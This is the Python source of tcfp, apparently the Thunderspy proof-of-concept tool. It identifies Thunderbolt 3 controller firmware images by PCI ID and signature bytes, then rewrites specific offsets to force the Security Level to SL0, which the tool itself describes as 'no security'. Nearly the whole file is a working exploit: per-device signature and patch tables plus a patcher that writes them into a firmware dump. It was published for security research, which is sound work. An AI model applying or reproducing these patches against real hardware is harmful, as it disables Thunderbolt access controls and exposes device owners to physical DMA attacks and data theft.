#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""
Thunderbolt 3 Host Controller Firmware Patcher (tcfp)
Copyright (C) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>

This program is free software: you can redistribute it and/or modify it under the terms of the GNU
General Public License as published by the Free Software Foundation, either version 3 of the
License, or (at your option)any later version.
This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details. You should have # received a copy of the GNU General
Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.

This PoC exploits a Thunderbolt 3 vulnerability that enables unauthenticated overriding of
Security Levels by patching host controller firmware. This tool has been released exclusively for
research purposes and is not intended for unlawful actions.
"""

import sys
import logging
import os
from enum import Enum

TCFP_VERSION = "1.0"

MIN_VALID_FILESIZE_INCR_AR = 229376    # AR2015, AR2016 incremental FW update
MIN_VALID_FILESIZE_INCR_TR = 430080    # TR2018 incremental FW update
MAX_VALID_FILESIZE = 1048576           # AR2015, AR2016 and TR2018 full dumps
MAX_VALID_DROM_ENTRIES_LEN = 200
DROM_BASE = 0x4210
DROM_ENTRIES_BASE = DROM_BASE + 21     # 0x4225
SL_MAX_NUM = 4
JUMP_ADDR_LEN = 3

pciIds = [
    # Source: https://pci-ids.ucw.cz/
    {0x1576: "DSL6340 Thunderbolt 3 Bridge [Alpine Ridge 2C 2015]"},
    {0x1578: "DSL6540 Thunderbolt 3 Bridge [Alpine Ridge 4C 2015]"},
    {0x15c0: "JHL6240 Thunderbolt 3 Bridge (Low Power) [Alpine Ridge LP 2016]"},
    {0x15da: "JHL6340 Thunderbolt 3 Bridge (C step) [Alpine Ridge 2C 2016]"},
    {0x15d3: "JHL6540 Thunderbolt 3 Bridge (C step) [Alpine Ridge 4C 2016]"},
    {0x15e7: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge 2C 2018]"},
    {0x15ea: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge 4C 2018]"},
    {0x15ef: "JHL7540 Thunderbolt 3 Bridge [Titan Ridge DD 2018]"},
    {0x15ee: "Ice Lake Thunderbolt 3 Bridge [Ice Lake 4C 2019]"}
]

slSigs = [
    # Listing all known patterns here, including tested NVM version.
    # NVM 33
    {'pci-id': 0x15da,
     'sl': 0,
     'sig': [{'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15da,
     'sl': 1,
     'sig': [{'offset': 0x800, 'value': b'\x19'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 2,
     'sig': [{'offset': 0x800, 'value': b'\x1A'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 3,
     'sig': [
        {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
        {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x40'}],
     'patch': [
        {'offset': 0x0,
        'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
        {'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15da,
     'sl': 3,
     'sig': [
         {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
         {'offset': 0x1800, 'value': b'\x1B'}, {'offset': 0x1001, 'value': b'\x20'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
         {'offset': 0x1000,
         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
         {'offset': 0x1800, 'value': b'\xFF'}, {'offset': 0x2008, 'value': b'\x37'}]
     },
    # NVM 41
    {'pci-id': 0x15d3,
     'sl': 0,
     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15d3,
     'sl': 1,
     'sig': [{'offset': 0x800, 'value': b'\xFF'}, {'offset': 0x1800, 'value': b'\x19'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
     },
    {'pci-id': 0x15d3,
     'sl': 2,
     'sig': [
         {'offset': 0x0, 'value': b'\xFF'}, {'offset': 0x800, 'value': b'\xFF'},
         {'offset': 0x1800, 'value': b'\x1A'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
         {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'},
         {'offset': 0x1000,
         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'}]
     },
    {'pci-id': 0x15d3,
     'sl': 3,
     'sig': [{'offset': 0x1000, 'value': b'\x00'}, {'offset': 0x1800, 'value': b'\x1B'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x20\x08\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'},
         {'offset': 0xFFC, 'value': b'\x10\x70\x03\x00'},
         {'offset': 0x1000,
         'value': b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'},
         {'offset': 0xA98, 'value': b'\x10\x00\x00\x04'},
         {'offset': 0x1A98, 'value': b'\xFF\xFF\xFF\xFF'}]
     },
    # NVM 28
    {'pci-id': 0x15d3,
     'sl': 1,
     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
     'patch': None
     },
    # NVM 36
    {'pci-id': 0x15ea,
     'sl': 0,
     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x18'}],
     'patch': None
     },
    {'pci-id': 0x15ea,
     'sl': 1,
     'sig': [{'offset': 0x0, 'value': b'\x00'}, {'offset': 0x800, 'value': b'\x19'}],
     'patch': [{'offset': 0x800, 'value': b'\x18'}]
     },
    {'pci-id': 0x15ea,
     'sl': 2,
     'sig': [
         {'offset': 0x0, 'value': b'\xFF'},
         {'offset': 0x800, 'value': b'\xFF'},
         {'offset': 0x1800, 'value': b'\x1A'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}, {'offset': 0x1800, 'value': b'\xFF'}]
     },
    {'pci-id': 0x15ea,
     'sl': 3,
     'sig': [
         {'offset': 0x0, 'value': b'\xFF'},
         {'offset': 0x800, 'value': b'\xFF'},
         {'offset': 0x1800, 'value': b'\x1B'}],
     'patch': [
         {'offset': 0x0,
         'value': b'\x00\x40\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
         {'offset': 0x800, 'value': b'\x18'}]
     },
]

offsets = [
    # Generic
    {'pci-id': 0x4005, 'len': 2},
    {'default-jump-addr': 0x1000, 'len': 2},
    {'nvm-rev-offs-jump-addr': 0xA, 'len': 1},
    # DROM
    {'entries-len': DROM_BASE+14, 'len': 2},
    {'vendor-id': DROM_BASE+16, 'len': 2},
    {'model-id': DROM_BASE+18, 'len': 2},
    {'nvm-rev': DROM_BASE+21, 'len': 1},
]

class ImageType(Enum):
    NOT_AVAILABLE = "N/A"
    INCREMENTAL_UPD = "Incremental"
    FULL_DUMP = "Full"


class Image:
    FileName = None
    ValidImage = False
    SupportedPciId = False
    PciId = 0
    PciDevName = "N/A"
    VendorStr = "N/A"
    DeviceStr = "N/A"
    VendorId = 0
    ModelId = 0
    NvmRev = 0
    SecurityLevel = -1
    MatchingSlSig = None
    ImageType = ImageType.NOT_AVAILABLE.value

    def _getNvmVersionAlternate(self, f):
        # Get jump address
        f.seek(0)
        pos = f.read(JUMP_ADDR_LEN)

        if(pos == b'\xFF\xFF\xFF'):
            # None specified in header, so jump to default jump address
            # TODO: clean up offsets data structure
            f.seek(self._getOffsetByParm("default-jump-addr")["default-jump-addr"])
            pos = swap(f.read(JUMP_ADDR_LEN), JUMP_ADDR_LEN)
        else:
            # Specified in header, so get the address
            f.seek(0)
            pos = swap(f.read(JUMP_ADDR_LEN), JUMP_ADDR_LEN)

        f.seek(pos + self._getOffsetByParm("nvm-rev-offs-jump-addr")["nvm-rev-offs-jump-addr"])
        try:
            value = hex(int.from_bytes(f.read(1), byteorder='big'))
            return int(value[2:])
        except Exception as e:
            logging.warning("Image declares unlikely NVM version")
            return 1

    def _getSigsByPciIdAndSl(self, pciId, sl):
        potentiallyMatchingSigs = []

        for sig in slSigs:
            # Match by PCI ID and SL
            if (sig["pci-id"] == pciId) and (sig["sl"] == sl):
                potentiallyMatchingSigs.append(sig)
            # pci-id == 0 => Ignore PCI ID, try matching against all patterns for given SL
            elif (pciId == 0 and sig["sl"] == sl):
                potentiallyMatchingSigs.append(sig)
        return potentiallyMatchingSigs

    def _getDeviceNameByPciId(self, devid):
        for device in pciIds:
            if devid in device:
                return device[devid]
        return "N/A"

    def _getOffsetByParm(self, parm):
        for offset in offsets:
            if parm in offset:
                return offset
        assert False, "Firmware parameter not supported: '" + parm + "'"

    def _parseImage(self, f, filename):
        # Size sanity check
        size = os.path.getsize(filename)
        if size < MIN_VALID_FILESIZE_INCR_AR:
            self.ImageType = ImageType.NOT_AVAILABLE.value
            raise Exception("File size smaller than " + str(MIN_VALID_FILESIZE_INCR_AR) +
                            " bytes. Image probably corrupted. Aborting.")
        elif size > MIN_VALID_FILESIZE_INCR_AR and size <= MIN_VALID_FILESIZE_INCR_TR:
            self.ImageType = ImageType.INCREMENTAL_UPD.value
            logging.warning("File size in between %s and %s bytes. Possible causes: %s"\
                " - Image may be an incremental firmware update. While tcfp may be able to parse "\
                "the SL state, please note patching requires a full dump. %s"\
                " - Image dump may be incomplete, i.e. not include 'scratch pad' section. However,"\
                " this should typically not cause any issues.", str(MIN_VALID_FILESIZE_INCR_AR),\
                    str(MAX_VALID_FILESIZE), os.linesep, os.linesep)
        elif size > MAX_VALID_FILESIZE:
            self.ImageType = ImageType.NOT_AVAILABLE.value
            logging.warning("File size exceeds %s bytes. Controller may be unsupported.",\
                 str(MAX_VALID_FILESIZE))
        else:
            self.ImageType = ImageType.FULL_DUMP.value

        # PCI metadata
        pos = self._getOffsetByParm("pci-id")
        f.seek(pos["pci-id"])
        self.PciId = swap(f.read(pos["len"]), pos["len"])

        self.PciDevName = self._getDeviceNameByPciId(self.PciId)
        logging.debug("Found PCI ID: %s ('%s')", str(hex(self.PciId)), self.PciDevName)

        if "Ice Lake" in self.PciDevName:
            logging.warning("Detected Ice Lake firmware image (PCI ID: '%s').",\
                str(hex(self.PciId)))
            raise Exception("Ice Lake images are currently unsupported. Aborting.")
        elif self.PciDevName != "N/A":
            self.SupportedPciId = True
        else:
            logging.warning("Unrecognized PCI ID: '%s'. Patching not supported.",\
                str(hex(self.PciId)))

        # Find DROM entries
        logging.debug("Parsing DROM.")
        pos = self._getOffsetByParm("entries-len")
        f.seek(pos["entries-len"])
        entriesLen = swap(f.read(pos["len"]), pos["len"])

        # DROM entries sanity check
        if entriesLen > MAX_VALID_DROM_ENTRIES_LEN:
            logging.warning("Image declares unlikely large DROM entries section (%s). Capping to \
                %s.", str(entriesLen), str(MAX_VALID_DROM_ENTRIES_LEN))
            entriesLen = MAX_VALID_DROM_ENTRIES_LEN

        pos = self._getOffsetByParm("vendor-id")
        f.seek(pos["vendor-id"])
        self.VendorId = swap(f.read(pos["len"]), pos["len"])
        pos = self._getOffsetByParm("model-id")
        f.seek(pos["model-id"])
        self.ModelId = swap(f.read(pos["len"]), pos["len"])
        pos = self._getOffsetByParm("nvm-rev")
        f.seek(pos["nvm-rev"])
        self.NvmRev = swap(f.read(pos["len"]), pos["len"])

        # If NvmRev==1, then this is likely a bogus value. Happens with some DROMs (cough, Intel).
        # Use the alternative route to get NvmRev.
        if(self.NvmRev == 1):
            logging.debug("DROM declares bogus NVM version. Determining value using alternative "\
                "method.")
            self.NvmRev = self._getNvmVersionAlternate(f)
            logging.debug("Got NVM version using alternative method: %s (%s)", str(self.NvmRev), hex(self.NvmRev))

        # Find vendor and device string offsets
        # Move to DROM entries base
        pos = DROM_ENTRIES_BASE
        f.seek(pos)
        entryType = int.from_bytes(f.read(1), byteorder='big')
        entryLen = int.from_bytes(f.read(1), byteorder='big')
        entryIdx = int.from_bytes(f.read(1), byteorder='big')

        # Iterate over DROM entries until we encounter entry type generic and entry index 1
        validEntriesSection = True
        while not((entryType == 0xC5 or entryType == 0xCB or entryType == 0xCC or entryType == 0)
                  and not(pos > DROM_ENTRIES_BASE + entriesLen) and entryIdx == 1):
            pos += entryLen
            f.seek(pos)
            entryType = int.from_bytes(f.read(1), byteorder='big')
            entryLen = int.from_bytes(f.read(1), byteorder='big')
            entryIdx = int.from_bytes(f.read(1), byteorder='big')

            if pos >= (DROM_ENTRIES_BASE + entriesLen):
                logging.warning(
                    "Image contains malformed DROM entries section. Ignoring.")
                validEntriesSection = False
                break

        logging.debug("Done parsing DROM.")
        if validEntriesSection == True:
            # Vendor string
            # Skip header bytes (entry type, entry length, entry index)
            pos += 3
            f.seek(pos)
            self.VendorStr = f.read(entryLen-3)
            # Device string
            pos += (entryLen-2)
            f.seek(pos)
            entryLen = int.from_bytes(f.read(1), byteorder='big')
            pos += 2
            f.seek(pos)
            self.DeviceStr = f.read(entryLen-3)
        else:
            self.VendorStr = "N/A"
            self.DeviceStr = "N/A"

        self.ValidImage = True

    def _debugPrintMatch(self, matchingSlSig:list, isHeuristics:bool, idx:int):
        if logging.root.level != logging.DEBUG:
            return
            
        logging.debug("Signature match:") if not isHeuristics else logging.debug("[%i] Heuristics match:", idx)

        for key in matchingSlSig:
            value = matchingSlSig[key]
            if isinstance(value, int) and key == "pci-id":
                value = self._getDeviceNameByPciId(value) + " (" + hex(value) + ")"
            elif isinstance(value, list) and (key == "sig" or key == "patch"):
                # No patch for this match
                if key == "patch" and matchingSlSig[key] is None:
                    value = "None"
                    break

                value = "["
                for offsval in matchingSlSig[key]:
                    value += "{'offset': " + hex(offsval["offset"]) + ", 'value': " + str(offsval["value"]) + "}, "
                value = value[:-2]
                value += "]"
            else:
                value = str(matchingSlSig[key])
            logging.debug("%s : %s", str(key), value)

    def _parseSecurityLevel(self, f):
        if self.SupportedPciId == False:
            logging.warning("Cannot parse SL: PCI ID unsupported.")
            return -1

        try:
            # Try all SL patterns for our PCI ID
            potentiallyMatchingSigs = []
            for i in range(SL_MAX_NUM):
                potentiallyMatchingSigs = self._getSigsByPciIdAndSl(
                    self.PciId, i)

                for sig in potentiallyMatchingSigs:
                    # All patterns for current signature must match
                    allPatternsMatch = True

                    for pattern in sig["sig"]:
                        f.seek(pattern["offset"])
                        data = f.read(len(pattern["value"]))
                        if data != pattern["value"]:
                            allPatternsMatch = False
                            break

                    if allPatternsMatch == True:
                        self.MatchingSlSig = sig
                        self._debugPrintMatch(self.MatchingSlSig, False, -1)
                        return i

            if len(potentiallyMatchingSigs) == 0:
                logging.warning("PCI ID '%s' has no known signatures. Ignoring PCI ID and trying "\
                    "all patterns instead.", str(hex(self.PciId)))
            else:
                logging.warning("No matching SL patterns for PCI ID '%s'. Ignoring PCI ID and "\
                    "trying all patterns instead.", str(hex(self.PciId)))

            # We did not recognize the PCI ID, or we do, but failed to match SL against its \
            # known signatures. Try matching against signatures for other devices.
            rankedMatchingSigs = []
            for i in range(SL_MAX_NUM):
                # pci-id == 0 -> ignore PCI ID; get all sigs for current SL
                potentiallyMatchingSigs = self._getSigsByPciIdAndSl(
                    0, i)

                for sig in potentiallyMatchingSigs:
                    # All patterns for current signature must match
                    allPatternsMatch = True

                    for pattern in sig["sig"]:
                        f.seek(pattern["offset"])
                        data = f.read(len(pattern["value"]))
                        if data != pattern["value"]:
                            allPatternsMatch = False
                            break

                    if allPatternsMatch == True:
                        rankedMatchingSigs = self._rankedInsertMatchingSig(sig, rankedMatchingSigs)
                        self.SupportedPciId = False

            # Return SL from most probable matching sig
            if len(rankedMatchingSigs) > 0:
                self.MatchingSlSig = rankedMatchingSigs[0]

                # Debug only: print ranked matching sigs
                for i, sig in enumerate(rankedMatchingSigs):
                    self._debugPrintMatch(sig, True, i)
                
                return rankedMatchingSigs[0]["sl"]
                
            # Heuristics did not find any matches. Bail out.
            logging.warning("No matching SL patterns found.")
            return -1
        except Exception as e: # pylint: disable=broad-except
            print("Cannot parse Security Level: ", e)
            return -1

    def _rankedInsertMatchingSig(self, newSig, rankedMatchingSigs):
        # Ensure rankedMatchingSigs[0] always represents the strongest match.
        # We rank matches as follows:
        # 1. SL signature: If the new sig has a higher all-matching offset-value count
        #    than our current top match, we favor the new sig.
        # 2. Patch pattern presence: If the new sig qualifies for (1), then:
        #  - If the new and existing top match either both or neither have a patch, then
        #    we favor the new sig.
        #  - Else, we favor the new sig if it has a patch pattern.
        #
        # TODO: Provide user ability to choose between ranked matches that provide a patch

        # Initial insert
        if len(rankedMatchingSigs) == 0:
            rankedMatchingSigs.insert(0, newSig)
            return rankedMatchingSigs

        # Matching SL signature: compare offset-value count
        if len(newSig["sig"]) > len(rankedMatchingSigs[0]["sig"]):
            if (newSig["patch"] == None and rankedMatchingSigs[0]["patch"] == None) or (newSig["patch"] != None and rankedMatchingSigs[0]["patch"] != None): 
                # Equal scores on both constraints, so rank new match on top.   
                rankedMatchingSigs.insert(0, newSig)
            elif newSig["patch"] == None:
                # Our new most probable match does not have a patch, but still a higher matching
                # sig count. Rank new one on top.
                rankedMatchingSigs.insert(0, newSig)

        return rankedMatchingSigs


    def __init__(self, filename):
        self.FileName = filename

        try:
            f = open(self.FileName, 'rb')
            self._parseImage(f, self.FileName)

            if self.ValidImage == True:
                self.SecurityLevel = self._parseSecurityLevel(f)
                if self.SecurityLevel == -1:
                    securityLevelStr = "N/A"
                else:
                    securityLevelStr = "SL" + str(self.SecurityLevel)

                self.imageParms = {
                    "Vendor ID": hex(self.VendorId),
                    "PCI ID": hex(self.PciId),
                    "PCI Device Name": self.PciDevName,
                    "Model ID": hex(self.ModelId),
                    "NVM version": str(self.NvmRev) + " (" + hex(self.NvmRev) + ")",
                    "Vendor": self.VendorStr.decode("utf-8"),
                    "Device": self.DeviceStr.decode("utf-8"),
                    "Image type": self.ImageType,
                    "Security Level": securityLevelStr
                }

            f.close()
        except IOError as e:
            raise Exception("Cannot read file: ", e)
        except Exception as e:
            raise Exception("Cannot parse image: ", e)


class Patcher:
    @staticmethod
    def PatchImage(image, targetSl):
        assert targetSl == 0, "Only SL0 is currently supported."
        assert image.ValidImage == True, "Not a valid firmware image, and this should have been "\
            "caught in image.ParseImage."

        if image.SecurityLevel == 0:
            raise Exception("Current SL is already 0. No need to patch.")
        if image.SecurityLevel == -1 and image.SupportedPciId == False:
            raise Exception(
                "PCI ID unsupported and unable to parse current SL. Aborting.")
        if image.SecurityLevel == -1 and image.SupportedPciId == True:
            raise Exception(
                "PCI ID supported, but unable to parse current SL (different NVM version?). "\
                    "Aborting.")
        if image.SecurityLevel != -1 and image.SupportedPciId == False:
            if image.MatchingSlSig["patch"] != None and len(image.MatchingSlSig["patch"]) > 0:
                logging.warning(
                    "PCI ID unsupported, but current SL detected through heuristics. Patching may "\
                        "fail.")
            else:
                raise Exception(
                    "PCI ID unsupported, but current SL detected through heuristics. No patch "\
                        "pattern available for this SL signature. Aborting.")
        if image.SecurityLevel != -1 and image.SupportedPciId == True \
            and image.MatchingSlSig["patch"] == None:
            raise Exception(
                "PCI ID supported, but no patch pattern available for this SL signature. Aborting.")

        if image.ImageType == ImageType.INCREMENTAL_UPD.value:
            logging.warning(
                "Image is likely an incremental firmware update. Patching may fail."
            )

        try:
            f = open(image.FileName, 'r+b')
            for pattern in image.MatchingSlSig["patch"]:
                f.seek(pattern["offset"])
                f.write(pattern['value'])
            f.close()
        except Exception as e:
            raise Exception("Cannot patch image: ", e)


def swap(x, len):
    return int.from_bytes(x, byteorder='little', signed=False)


def printHelp():
    print("Thunderbolt 3 Host Controller Firmware Patcher", os.linesep,\
        "(c) 2020 Björn Ruytenberg <bjorn@bjornweb.nl>. Licensed under GPLv3.", os.linesep,\
        os.linesep,\
        "Usage: tcfp.py [verb] [FILE] [-v]", os.linesep, os.linesep,\
        "parse\t\tParse firmware image metadata and Security Level.", os.linesep,\
        "patch\t\tPatch firmware image to override Security Level to SL0 (no security).",\
        os.linesep,\
        "version\tShow program's version number and exit.", os.linesep,\
        "help\t\tShow this help message.", os.linesep,\
        "-v\t\tEnable verbose output.", os.linesep
        )


def printVersion():
    print(
        "Thunderbolt 3 Host Controller Firmware Patcher {1}{0}(c) 2020 Björn Ruytenberg{0}"\
            "https://thunderspy.io{0}{0}Licensed under GNU GPLv3 or later "\
            "<http://gnu.org/licenses/gpl.html>.".format(os.linesep, TCFP_VERSION))


def main():
    # TODO: Migrate to argparse
    _verbose = False

    if (len(sys.argv) > 3 and sys.argv[3] == "-v"):
        _verbose = True
        logging.basicConfig(level=logging.DEBUG,
                            format='%(asctime)s - %(levelname)s - %(message)s')
    else:
        logging.basicConfig(level=logging.WARNING,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    if (len(sys.argv) == 1 or sys.argv[1].startswith("h")):
        printHelp()
    elif(sys.argv[1] == "version"):
        printVersion()
    elif (sys.argv[1] == "parse" or sys.argv[1] == "patch"):
        if len(sys.argv) < 3:
            print("Missing argument 'file'.")
            return
        if len(sys.argv) > 3 and not _verbose:
            print("Unrecognized additional arguments given.")
            return
        try:
            image = Image(str(sys.argv[2]))
            for parm in image.imageParms:
                print(parm, ":", image.imageParms[parm])
            print("")

            if sys.argv[1].startswith("patch") == True:
                Patcher.PatchImage(image, 0)
                print("Image patched succesfully.")

        except Exception as e: # pylint: disable=broad-except
            print("Error while processing firmware image: ", e)
    elif len(sys.argv) >= 2 and not _verbose:
        print("Unknown argument(s) given.")

if __name__ == '__main__':
    if (sys.version_info < (3, 4)):
        print("This script requires Python 3.4 or later. Aborting.")
    else:
        main()
